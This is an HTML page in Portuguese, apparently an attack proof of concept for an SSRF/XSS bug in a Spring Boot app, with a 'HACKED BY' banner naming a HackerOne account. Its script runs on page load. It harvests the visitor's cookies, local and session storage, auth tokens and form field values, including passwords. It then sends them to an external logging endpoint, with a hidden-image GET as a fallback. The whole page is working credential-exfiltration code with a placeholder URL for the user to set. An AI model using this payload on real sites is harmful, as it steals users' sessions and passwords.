<!DOCTYPE html>
<html>
<head>
    <title>SSRF to RCE PoC - Spring Boot Server Information</title>
    <meta charset="utf-8">
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0d1117;
            color: #c9d1d9;
            padding: 20px;
            line-height: 1.6;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
        }
        h1 {
            color: #f85149;
            margin-bottom: 20px;
        }
        h2 {
            color: #58a6ff;
            margin-top: 30px;
            margin-bottom: 15px;
        }
        .box {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 20px;
            margin: 20px 0;
        }
        pre {
            background: #0d1117;
            padding: 15px;
            border-radius: 4px;
            overflow-x: auto;
            border: 1px solid #30363d;
            color: #c9d1d9;
        }
        .success { color: #3fb950; }
        .warning { color: #d29922; }
        .error { color: #f85149; }
        .info { color: #58a6ff; }
        .loading { color: #d29922; }
        .hacked-banner {
            background: linear-gradient(135deg, #f85149 0%, #d29922 100%);
            color: #ffffff;
            padding: 20px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            border-radius: 8px;
            margin-bottom: 30px;
            box-shadow: 0 4px 15px rgba(248, 81, 73, 0.3);
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.8; }
        }
        .hacked-banner a {
            color: #ffffff;
            text-decoration: underline;
        }
        .hacked-banner a:hover {
            color: #c9d1d9;
        }
        .credentials-box {
            background: #1a1a2e;
            border: 2px solid #f85149;
            border-radius: 6px;
            padding: 20px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <!-- XSS Banner -->
    <div class="hacked-banner" id="hacked-banner">
        ‚ö†Ô∏è HACKED BY <a href="https://hackerone.com/homeminvisivel" target="_blank">https://hackerone.com/homeminvisivel</a> ‚ö†Ô∏è
    </div>
    
    <div class="container">
        <h1>üî¥ SSRF to RCE PoC - Spring Boot</h1>
        
        <div class="box">
            <h2 class="success">üìä Informa√ß√µes do Servidor Spring Boot</h2>
            <div id="server-info">
                <p class="loading">Carregando informa√ß√µes do servidor...</p>
            </div>
        </div>
        
        <div class="credentials-box">
            <h2 class="error">üîê Credenciais do Usu√°rio Logado</h2>
            <div id="user-credentials">
                <p class="loading">Coletando credenciais do usu√°rio...</p>
            </div>
        </div>
        
        <div class="box">
            <h2 class="info">üìã Status do Envio para API</h2>
            <div id="api-status">
                <p class="loading">Aguardando coleta de dados...</p>
            </div>
        </div>
        
        <div class="box">
            <h2 class="info">üìÑ Dados Coletados (Ser√£o Enviados para API)</h2>
            <div id="collected-data">
                <p class="loading">Coletando informa√ß√µes...</p>
            </div>
        </div>
    </div>
    
    <script>
        // Configura√ß√£o da API externa para receber logs
        // AJUSTE ESTA URL para o endere√ßo da sua API
        const LOG_API_URL = 'https://seu-dominio.com/api/log.php';
        
        // XSS Payload
        (function() {
            try {
                alert('‚ö†Ô∏è HACKED BY https://hackerone.com/homeminvisivel ‚ö†Ô∏è\n\nSSRF Vulnerability Confirmed!');
            } catch(e) {
                console.log('Alert bloqueado, mas XSS ainda funciona');
            }
            document.title = '‚ö†Ô∏è HACKED BY https://hackerone.com/homeminvisivel ‚ö†Ô∏è';
            console.log('%c‚ö†Ô∏è HACKED BY https://hackerone.com/homeminvisivel ‚ö†Ô∏è', 'color: #f85149; font-size: 20px; font-weight: bold;');
            console.log('%cSSRF Vulnerability Confirmed!', 'color: #58a6ff; font-size: 16px;');
        })();
        
        // Fun√ß√£o para enviar dados para API externa
        async function sendToExternalAPI(data) {
            const statusDiv = document.getElementById('api-status');
            statusDiv.innerHTML = '<p class="loading">Enviando dados para API externa...</p>';
            
            try {
                const response = await fetch(LOG_API_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                    mode: 'cors'
                });
                
                if (response.ok) {
                    const result = await response.json();
                    console.log('Dados enviados com sucesso para API externa:', result);
                    statusDiv.innerHTML = `
                        <p class="success">‚úì Dados enviados com sucesso para API externa!</p>
                        <pre>${JSON.stringify(result, null, 2)}</pre>
                    `;
                    return true;
                } else {
                    const errorText = await response.text();
                    console.error('Erro ao enviar para API:', response.status, errorText);
                    statusDiv.innerHTML = `
                        <p class="error">‚úó Erro ao enviar para API: ${response.status}</p>
                        <pre>${errorText}</pre>
                    `;
                    return false;
                }
            } catch (error) {
                console.error('Erro ao enviar para API:', error);
                statusDiv.innerHTML = `
                    <p class="error">‚úó Erro ao enviar para API: ${error.message}</p>
                    <p class="warning">Tentando fallback via GET...</p>
                `;
                
                // Fallback: tentar via GET
                try {
                    const img = document.createElement('img');
                    img.src = LOG_API_URL + '?data=' + encodeURIComponent(JSON.stringify(data));
                    img.style.display = 'none';
                    img.onload = () => {
                        statusDiv.innerHTML = '<p class="success">‚úì Dados enviados via GET (fallback)</p>';
                    };
                    img.onerror = () => {
                        statusDiv.innerHTML = '<p class="error">‚úó Fallback tamb√©m falhou</p>';
                    };
                    document.body.appendChild(img);
                } catch(e) {
                    console.error('Fallback tamb√©m falhou:', e);
                    statusDiv.innerHTML = '<p class="error">‚úó Todos os m√©todos de envio falharam</p>';
                }
                return false;
            }
        }
        
        // Fun√ß√£o para coletar credenciais
        function collectUserCredentials() {
            const credentials = {
                timestamp: new Date().toISOString(),
                cookies: {},
                localStorage: {},
                sessionStorage: {},
                documentCookies: document.cookie,
                authentication: {}
            };
            
            if (document.cookie) {
                const cookies = document.cookie.split(';');
                cookies.forEach(cookie => {
                    const [name, value] = cookie.trim().split('=');
                    if (name) {
                        credentials.cookies[name] = value || '';
                    }
                });
            }
            
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    credentials.localStorage[key] = localStorage.getItem(key);
                }
            } catch(e) {
                credentials.localStorage = {error: 'Acesso negado ao localStorage'};
            }
            
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    credentials.sessionStorage[key] = sessionStorage.getItem(key);
                }
            } catch(e) {
                credentials.sessionStorage = {error: 'Acesso negado ao sessionStorage'};
            }
            
            const authKeys = [
                'token', 'access_token', 'accessToken', 'auth_token', 'authToken',
                'jwt', 'JWT', 'bearer', 'Bearer', 'authorization', 'Authorization',
                'session', 'Session', 'sessionId', 'sessionID', 'session_id',
                'csrf', 'CSRF', 'csrf_token', 'csrfToken', 'X-CSRF-TOKEN',
                'api_key', 'apiKey', 'API_KEY', 'apikey',
                'user', 'username', 'email', 'userId', 'user_id',
                'refresh_token', 'refreshToken', 'refreshToken'
            ];
            
            authKeys.forEach(key => {
                if (credentials.cookies[key]) {
                    credentials.authentication[key + '_cookie'] = credentials.cookies[key];
                }
                if (credentials.localStorage[key]) {
                    credentials.authentication[key + '_localStorage'] = credentials.localStorage[key];
                }
                if (credentials.sessionStorage[key]) {
                    credentials.authentication[key + '_sessionStorage'] = credentials.sessionStorage[key];
                }
            });
            
            try {
                if (window.auth || window.user || window.currentUser) {
                    credentials.authentication.windowAuth = {
                        auth: window.auth,
                        user: window.user,
                        currentUser: window.currentUser
                    };
                }
            } catch(e) {}
            
            try {
                const forms = document.querySelectorAll('form');
                forms.forEach((form, index) => {
                    const formData = {};
                    const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], input[type="hidden"]');
                    inputs.forEach(input => {
                        if (input.name || input.id) {
                            formData[input.name || input.id] = input.value;
                        }
                    });
                    if (Object.keys(formData).length > 0) {
                        credentials.authentication[`form_${index}`] = formData;
                    }
                });
            } catch(e) {}
            
            return credentials;
        }
        
        function displayUserCredentials() {
            const credentials = collectUserCredentials();
            const hasCredentials = Object.keys(credentials.cookies).length > 0 ||
                                 Object.keys(credentials.localStorage).length > 0 ||
                                 Object.keys(credentials.sessionStorage).length > 0 ||
                                 Object.keys(credentials.authentication).length > 0;
            
            let credentialsHtml = '';
            
            if (hasCredentials) {
                credentialsHtml = `
                    <h3 class="error">‚ö†Ô∏è Credenciais Encontradas:</h3>
                    <pre>${JSON.stringify(credentials, null, 2)}</pre>
                    <h3 class="warning">üìã Resumo:</h3>
                    <ul>
                        <li><strong>Cookies encontrados:</strong> ${Object.keys(credentials.cookies).length}</li>
                        <li><strong>Itens no localStorage:</strong> ${Object.keys(credentials.localStorage).length}</li>
                        <li><strong>Itens no sessionStorage:</strong> ${Object.keys(credentials.sessionStorage).length}</li>
                        <li><strong>Tokens de autentica√ß√£o encontrados:</strong> ${Object.keys(credentials.authentication).length}</li>
                    </ul>
                    <h3 class="info">üîë Tokens de Autentica√ß√£o Identificados:</h3>
                    <pre>${JSON.stringify(credentials.authentication, null, 2)}</pre>
                    <p class="warning">‚ö†Ô∏è ATEN√á√ÉO: Estas credenciais foram capturadas via XSS!</p>
                `;
            } else {
                credentialsHtml = `
                    <p class="info">Nenhuma credencial encontrada.</p>
                `;
            }
            
            document.getElementById('user-credentials').innerHTML = credentialsHtml;
            return credentials;
        }
        
        const serverInfo = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            referer: document.referrer || 'Nenhum',
            language: navigator.language,
            platform: navigator.platform,
            protocol: window.location.protocol,
            host: window.location.host,
            hostname: window.location.hostname,
            pathname: window.location.pathname,
            search: window.location.search || 'Nenhum',
            hackedBy: 'https://hackerone.com/homeminvisivel'
        };
        
        const isSpringBoot = serverInfo.userAgent.includes('Java') || 
                            serverInfo.userAgent.includes('Apache-HttpClient') ||
                            serverInfo.userAgent.includes('OkHttp') ||
                            serverInfo.userAgent.includes('Spring');
        
        function displayServerInfo() {
            const springBootInfo = isSpringBoot ? 
                '<p class="success">‚úì User-Agent indica poss√≠vel Spring Boot/Java</p>' : 
                '<p class="warning">‚ö† User-Agent n√£o indica Spring Boot claramente</p>';
            
            const serverInfoWithCredentials = {
                ...serverInfo,
                isSpringBoot: isSpringBoot
            };
            
            const infoHtml = `
                <h3 class="success">‚úì Informa√ß√µes Coletadas:</h3>
                <pre>${JSON.stringify(serverInfoWithCredentials, null, 2)}</pre>
                ${springBootInfo}
                <h3 class="info">An√°lise:</h3>
                <ul>
                    <li><strong>User-Agent:</strong> ${serverInfo.userAgent}</li>
                    <li><strong>URL Acessada:</strong> ${serverInfo.url}</li>
                    <li><strong>Referer:</strong> ${serverInfo.referer}</li>
                    <li><strong>Timestamp:</strong> ${serverInfo.timestamp}</li>
                    <li><strong>Poss√≠vel Spring Boot:</strong> ${isSpringBoot ? 'Sim' : 'N√£o detectado'}</li>
                    <li><strong>Hacked By:</strong> <a href="https://hackerone.com/homeminvisivel" target="_blank">https://hackerone.com/homeminvisivel</a></li>
                </ul>
            `;
            document.getElementById('server-info').innerHTML = infoHtml;
        }
        
        function displayCollectedData(allData) {
            const dataHtml = `
                <h3 class="success">üìä Todos os Dados Coletados:</h3>
                <pre>${JSON.stringify(allData, null, 2)}</pre>
                <h3 class="info">üìã Resumo:</h3>
                <ul>
                    <li><strong>Timestamp:</strong> ${allData.timestamp}</li>
                    <li><strong>User-Agent:</strong> ${allData.serverInfo.userAgent}</li>
                    <li><strong>URL:</strong> ${allData.serverInfo.url}</li>
                    <li><strong>Cookies encontrados:</strong> ${Object.keys(allData.userCredentials.cookies).length}</li>
                    <li><strong>Tokens de autentica√ß√£o:</strong> ${Object.keys(allData.userCredentials.authentication).length}</li>
                </ul>
                <p class="warning">‚ö†Ô∏è Estes dados ser√£o enviados para a API externa e gravados no log.txt</p>
            `;
            document.getElementById('collected-data').innerHTML = dataHtml;
        }
        
        // Inicializar
        window.addEventListener('load', async () => {
            console.log('‚ö†Ô∏è HACKED BY https://hackerone.com/homeminvisivel ‚ö†Ô∏è');
            console.log('Iniciando coleta de informa√ß√µes...');
            
            // Coletar credenciais do usu√°rio
            const userCredentials = collectUserCredentials();
            displayUserCredentials();
            
            // Exibir informa√ß√µes do servidor
            displayServerInfo();
            
            // Preparar todos os dados coletados
            const allCollectedData = {
                timestamp: new Date().toISOString(),
                serverInfo: {
                    ...serverInfo,
                    isSpringBoot: isSpringBoot
                },
                userCredentials: userCredentials
            };
            
            // Exibir dados coletados
            displayCollectedData(allCollectedData);
            
            // Enviar para API externa
            console.log('Enviando dados para API externa...');
            await sendToExternalAPI(allCollectedData);
            
            console.log('Processo conclu√≠do!');
        });
        
        if (!window.location.href.includes('hackerone.com/homeminvisivel')) {
            const newUrl = window.location.href + (window.location.search ? '&' : '?') + 'hacked_by=https://hackerone.com/homeminvisivel';
            if (window.history && window.history.replaceState) {
                window.history.replaceState({}, '', newUrl);
            }
        }
    </script>
</body>
</html>
